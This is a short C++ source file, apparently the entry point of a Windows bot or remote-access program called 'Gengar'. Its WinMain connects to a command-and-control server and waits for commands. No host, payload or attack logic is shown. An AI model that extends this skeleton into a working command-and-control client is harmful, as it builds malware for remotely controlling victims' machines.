#include "gengar.h"

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	Gengar gengar;
	gengar.ConnectToCnc();
	gengar.ListenForCommand();
}
